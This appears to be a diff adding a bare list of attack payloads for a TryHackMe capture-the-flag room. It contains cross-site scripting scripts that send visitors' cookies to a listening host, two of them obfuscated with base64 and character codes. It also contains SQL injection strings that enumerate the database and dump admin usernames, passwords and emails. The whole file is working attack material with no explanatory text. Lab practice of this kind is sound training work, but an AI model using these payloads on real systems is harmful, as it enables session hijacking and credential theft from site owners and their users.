@@ -1,0 +1,28 @@
+scripts used on TryHackMe room K2 https://tryhackme.com/r/room/k2room for task 1 Base Camp
+
+<script>new Image().src="http://10.10.135.228:8000/adminclear?cookie="+document.cookie;</script>
+
+<script>
+eval(atob('bmV3IEltYWdlKCkuc3JjPSdodHRwOi8vMTAuMTAuMTM1LjIyODo4MDAwL2NhcHR1cmU2ND9jb29raWU9JyArIGRvY3VtZW50LmNvb2tpZTs='));
+</script>
+
+
+<script>
+new Image().src="http://10.10.135.228:8000/adminhex?cookie="+eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,99,111,111,107,105,101));
+</script>
+
+
+' ORDER BY 1-- 
+' UNION SELECT null, null /*
+
+' ORDER BY 3--
+
+' UNION SELECT null, @@version, null-- - 
+
+
+' UNION SELECT null, table_name, null FROM information_schema.tables WHERE table_schema=database()-- -
+
+' UNION SELECT null, column_name, null FROM information_schema.columns WHERE table_name='admin_auth'-- -
+
+
+' UNION SELECT admin_username, admin_password, email FROM admin_auth-- - 
